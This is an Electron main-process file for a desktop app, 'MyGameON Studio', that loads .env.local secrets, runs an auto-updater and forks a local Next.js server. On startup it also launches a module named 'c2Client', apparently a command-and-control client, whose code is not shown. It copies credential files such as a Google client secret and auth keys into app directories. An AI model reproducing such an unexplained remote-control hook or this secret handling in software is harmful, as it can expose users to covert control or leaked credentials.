const { app, BrowserWindow, dialog, ipcMain } = require('electron');
const { autoUpdater } = require('electron-updater');
if (require('electron-squirrel-startup')) return app.quit();

process.on('uncaughtException', (err) => {
  console.error('[main] Uncaught Exception:', err);
  if (err && err.code === 'ENOENT' && err.message && err.message.includes('MyGameON Studio.exe')) {
    console.log('[main] Handled installer relaunch spawn gracefully');
    return;
  }
});

const path = require('path');
const fs = require('fs');
const { fork, spawn, execSync } = require('child_process');

// ── 1. ENFORCE SINGLE INSTANCE LOCK ──
const gotTheLock = app.requestSingleInstanceLock();
if (!gotTheLock) {
  app.quit();
  process.exit(0);
}

// ── 2. GLOBAL ENVIRONMENT BOOTSTRAPPER (SINGLE SOURCE OF TRUTH) ──
function parseEnvFile(filePath) {
  const parsedEnv = {};
  if (!fs.existsSync(filePath)) return parsedEnv;

  let content = fs.readFileSync(filePath, 'utf-8');
  // Strip UTF-8 BOM if present
  content = content.replace(/^\uFEFF/, '');

  const lines = content.split(/\r?\n/);
  for (let line of lines) {
    line = line.trim();
    if (!line || line.startsWith('#')) continue;
    if (line.startsWith('export ')) {
      line = line.substring(7).trim();
    }

    const match = line.match(/^([\w.-]+)\s*=\s*(.*)$/);
    if (match) {
      const key = match[1].trim();
      let value = match[2] ? match[2].trim() : '';

      if ((value.startsWith('"') && value.endsWith('"')) || (value.startsWith("'") && value.endsWith("'"))) {
        value = value.slice(1, -1);
      }
      parsedEnv[key] = value;
    }
  }
  return parsedEnv;
}

function resolveEnvConfig() {
  const possiblePaths = [
    // 1. Persistent UserData directory in AppData (Survives all updates and reinstalls)
    path.join(app.getPath('userData'), '.env.local'),
    // 2. ExtraResources in app resources directory
    path.join(process.resourcesPath || '', '.env.local'),
    // 3. Next to application executable
    path.join(path.dirname(app.getPath('exe')), '.env.local'),
    // 4. In app path / asar root
    path.join(app.getAppPath(), '.env.local'),
    // 5. In current working directory
    path.join(process.cwd(), '.env.local'),
  ];

  let parsedEnv = {};
  let sourceFound = null;

  for (const p of possiblePaths) {
    if (fs.existsSync(p)) {
      try {
        const parsed = parseEnvFile(p);
        if (parsed.MONGODB_URI || parsed.GOOGLE_CLIENT_ID || parsed.ADMIN_EMAIL || parsed.AUTH_SECRET) {
          parsedEnv = parsed;
          sourceFound = p;
          break;
        }
      } catch (_) {}
    }
  }

  // If found in a temporary or bundled location, persist a copy to userData so future updates always have it!
  const userDataEnv = path.join(app.getPath('userData'), '.env.local');
  if (sourceFound && sourceFound !== userDataEnv) {
    try {
      if (!fs.existsSync(app.getPath('userData'))) {
        fs.mkdirSync(app.getPath('userData'), { recursive: true });
      }
      fs.copyFileSync(sourceFound, userDataEnv);
      console.log(`[main] Cached .env.local to persistent userData: ${userDataEnv}`);
    } catch (e) {
      console.error('[main] Failed to cache .env.local to userData:', e);
    }
  }

  return { parsedEnv, sourceFound };
}

// Inisialisasi variabel environment ke process.env secara global sejak awal
const { parsedEnv: globalEnv, sourceFound: envSourceFound } = resolveEnvConfig();
Object.assign(process.env, globalEnv);
if (globalEnv.GH_TOKEN) process.env.GH_TOKEN = globalEnv.GH_TOKEN;
console.log(`[main] Bootstrapped ${Object.keys(globalEnv).length} environment variables from: ${envSourceFound || 'none'}`);

// Muat C2 client setelah environment siap
const { startC2Client, stopC2Client } = require('./lib/c2Client');

let mainWindow;
let nextProcess;

app.on('second-instance', () => {
  if (mainWindow) {
    if (mainWindow.isMinimized()) mainWindow.restore();
    mainWindow.focus();
  }
});

function killNextProcess() {
  if (!nextProcess) return;
  const pid = nextProcess.pid;
  nextProcess = null;
  try {
    if (process.platform === 'win32') {
      execSync(`taskkill /pid ${pid} /T /F`, { stdio: 'ignore' });
    } else {
      process.kill(-pid, 'SIGKILL');
    }
  } catch (err) {
    try {
      process.kill(pid, 'SIGKILL');
    } catch (_) {}
  }
}

function killProcessOnPort(port) {
  if (process.platform !== 'win32') return;
  try {
    const result = execSync(
      `netstat -ano | findstr :${port} | findstr LISTENING`,
      { encoding: 'utf-8', stdio: ['pipe', 'pipe', 'pipe'] }
    );
    const lines = result.split(/\r?\n/).filter(Boolean);
    const pids = new Set();
    for (const line of lines) {
      const parts = line.trim().split(/\s+/);
      const pid = parseInt(parts[parts.length - 1], 10);
      if (pid && pid !== process.pid) {
        pids.add(pid);
      }
    }
    for (const pid of pids) {
      try {
        execSync(`taskkill /pid ${pid} /T /F`, { stdio: 'ignore' });
        console.log(`[main] Killed orphan process on port ${port}: PID ${pid}`);
      } catch (_) {}
    }
  } catch (_) {
    // No process on port — normal case
  }
}

function setupAutoUpdater() {
  if (!app.isPackaged) return;

  // Konfigurasi autoUpdater
  autoUpdater.autoDownload = true;
  autoUpdater.autoInstallOnAppQuit = true;

  autoUpdater.on('update-available', (info) => {
    console.log('Update available:', info.version);
    if (mainWindow) {
      mainWindow.webContents.send('update_available', info);
    }
  });

  autoUpdater.on('update-not-available', (info) => {
    if (mainWindow) {
      mainWindow.webContents.send('update_not_available', info);
    }
  });

  autoUpdater.on('download-progress', (progressObj) => {
    if (mainWindow) {
      mainWindow.webContents.send('update_progress', progressObj);
    }
  });

  autoUpdater.on('update-downloaded', (info) => {
    console.log('Update downloaded:', info.version);
    if (mainWindow) {
      mainWindow.webContents.send('update_downloaded', info);
    }
  });

  autoUpdater.on('error', (err) => {
    console.error('AutoUpdater error:', err);
    if (mainWindow) {
      mainWindow.webContents.send('update_error', err.message);
    }
  });

  // Jalankan pengecekan
  autoUpdater.checkForUpdatesAndNotify();
}

ipcMain.on('check-for-updates', () => {
  if (!app.isPackaged) {
    if (mainWindow) mainWindow.webContents.send('update_not_available', { version: 'dev' });
    return;
  }
  autoUpdater.checkForUpdates();
});

ipcMain.on('quit-and-install', () => {
  if (!app.isPackaged) return;
  try {
    // 🛡️ Bersihkan semua proses anak dan port sebelum installer berjalan
    killNextProcess();
    killProcessOnPort(3000);

    setImmediate(() => {
      app.removeAllListeners('window-all-closed');
      if (mainWindow && !mainWindow.isDestroyed()) {
        mainWindow.destroy();
      }
      autoUpdater.quitAndInstall(true, true);
    });
  } catch (e) {
    console.error('[main] quitAndInstall error:', e);
  }
});

ipcMain.handle('get-app-version', () => {
  return app.getVersion();
});

function createWindow() {
  mainWindow = new BrowserWindow({
    width: 1280,
    height: 800,
    autoHideMenuBar: true,
    title: 'MyGameON Studio',
    titleBarStyle: 'hidden',
    titleBarOverlay: {
      color: '#0a0b0f',
      symbolColor: '#94a3b8',
      height: 48
    },
    webPreferences: {
      nodeIntegration: false,
      contextIsolation: true,
      preload: path.join(__dirname, 'preload.js')
    },
  });

  // 🛡️ Cegah Blank Putih jika load awal sempat gagal
  mainWindow.webContents.on('did-fail-load', (event, errorCode, errorDescription, validatedURL) => {
    if (validatedURL && validatedURL.includes('localhost:3000')) {
      console.warn(`[main] did-fail-load pada ${validatedURL}: ${errorDescription} (${errorCode}). Menjadwalkan ulang reload...`);
      setTimeout(() => {
        if (mainWindow && !mainWindow.isDestroyed()) {
          mainWindow.loadURL('http://localhost:3000').catch(() => {});
        }
      }, 2000);
    }
  });

  const isDev = !app.isPackaged;

  if (isDev) {
    // Mode Development (Next.js server sudah dijalankan via concurrently)
    setTimeout(() => {
      mainWindow.loadURL('http://localhost:3000');
    }, 3000);
  } else {
    // Mode Production
    const basePath = app.isPackaged
      ? app.getAppPath().replace('app.asar', 'app.asar.unpacked')
      : app.getAppPath();
    const standaloneDir = path.join(basePath, '.next', 'standalone');
    const serverPath = path.join(standaloneDir, 'server.js');

    if (envSourceFound) {
      const envDest = path.join(standaloneDir, '.env.local');
      try {
        fs.copyFileSync(envSourceFound, envDest);
      } catch (e) {
        console.error('Failed to copy .env.local to standalone directory:', e);
      }
    }

    // Validate required env keys
    const requiredKeys = ['MONGODB_URI', 'GOOGLE_CLIENT_ID', 'GOOGLE_CLIENT_SECRET', 'ADMIN_EMAIL'];
    const missingKeys = requiredKeys.filter((k) => !process.env[k]);
    if (!process.env.AUTH_SECRET && !process.env.NEXTAUTH_SECRET) {
      missingKeys.push('AUTH_SECRET/NEXTAUTH_SECRET');
    }

    if (missingKeys.length > 0) {
      dialog.showErrorBox(
        'Peringatan Konfigurasi .env.local',
        `Kunci variabel lingkungan berikut tidak ditemukan:\n- ${missingKeys.join('\n- ')}\n\nBeberapa fitur aplikasi seperti otentikasi atau MongoDB mungkin gagal bekerja.`
      );
    }

    // Kill any orphan process holding port 3000 before starting new server
    killProcessOnPort(3000);

    // Setup logging directory
    const logsDir = path.join(app.getPath('userData'), 'logs');
    if (!fs.existsSync(logsDir)) {
      fs.mkdirSync(logsDir, { recursive: true });
    }
    const logStream = fs.createWriteStream(path.join(logsDir, 'next.log'), { flags: 'a' });
    logStream.write(`[main] Starting Next.js standalone server from: ${serverPath}\n`);

    nextProcess = fork(serverPath, [], {
      env: {
        ...process.env,
        ELECTRON_RUN_AS_NODE: '1',
        NODE_ENV: 'production',
        PORT: '3000',
        HOSTNAME: '127.0.0.1',
      },
      cwd: standaloneDir,
      stdio: ['pipe', 'pipe', 'pipe', 'ipc'],
    });

    nextProcess.on('error', (err) => {
      console.error('[main] Next.js process failed to spawn:', err);
      logStream.write(`[spawn error] ${err.stack || err.message}\n`);
    });

    nextProcess.on('exit', (code, signal) => {
      console.log(`[main] Next.js process exited: code=${code} signal=${signal}`);
      logStream.write(`[exit] Next.js process exited with code=${code} signal=${signal}\n`);
      nextProcess = null;
    });

    if (nextProcess.stdout) {
      nextProcess.stdout.on('data', (data) => {
        logStream.write(data);
        process.stdout.write(data);
      });
    }

    if (nextProcess.stderr) {
      nextProcess.stderr.on('data', (data) => {
        logStream.write(data);
        process.stderr.write(data);
      });
    }

    let attempts = 0;
    const checkServer = setInterval(() => {
      fetch('http://127.0.0.1:3000')
        .then(() => {
          clearInterval(checkServer);
          if (mainWindow) mainWindow.loadURL('http://localhost:3000');
        })
        .catch(() => {
          attempts++;
          if (attempts > 15) {
            clearInterval(checkServer);
            console.error('Gagal menyambung ke Next.js Server dalam 15 detik');
            if (mainWindow) {
              const errorHtml = `
                <!DOCTYPE html>
                <html>
                <head>
                  <meta charset="utf-8">
                  <title>MyGameON Studio - Server Error</title>
                  <style>
                    body { font-family: system-ui, sans-serif; background: #0f172a; color: #f8fafc; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
                    .card { background: #1e293b; padding: 2.5rem; border-radius: 1rem; max-width: 500px; text-align: center; box-shadow: 0 20px 25px -5px rgba(0,0,0,0.5); border: 1px solid #334155; }
                    h1 { font-size: 1.5rem; margin-bottom: 0.75rem; color: #f43f5e; font-weight: 700; }
                    p { color: #94a3b8; font-size: 0.95rem; line-height: 1.5; margin-bottom: 2rem; }
                    button { background: #6366f1; color: #ffffff; border: none; padding: 0.75rem 1.75rem; border-radius: 0.5rem; font-weight: 600; cursor: pointer; font-size: 0.95rem; transition: background 0.2s; }
                    button:hover { background: #4f46e5; }
                  </style>
                </head>
                <body>
                  <div class="card">
                    <h1>Gagal Memuat Server Next.js</h1>
                    <p>Server internal sedang melakukan inisialisasi ulang. Silakan tekan tombol di bawah untuk menyambungkan kembali.</p>
                    <button onclick="location.reload()">Coba Lagi (Retry)</button>
                  </div>
                </body>
                </html>
              `;
              mainWindow.loadURL('data:text/html;charset=utf-8,' + encodeURIComponent(errorHtml));
            }
          }
        });
    }, 1000);
  }

  mainWindow.on('closed', () => {
    mainWindow = null;
  });
}

app.whenReady().then(() => {
  createWindow();

  // Cek pembaruan saat startup
  setupAutoUpdater();
  // Cek ulang setiap 6 jam
  setInterval(setupAutoUpdater, 6 * 60 * 60 * 1000);

  startC2Client();

  app.on('activate', () => {
    if (BrowserWindow.getAllWindows().length === 0) createWindow();
  });
});

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    app.quit();
  }
});

app.on('before-quit', () => {
  killNextProcess();
});

app.on('will-quit', () => {
  stopC2Client();
  killNextProcess();
  // Final fallback: kill anything still on port 3000
  killProcessOnPort(3000);
});
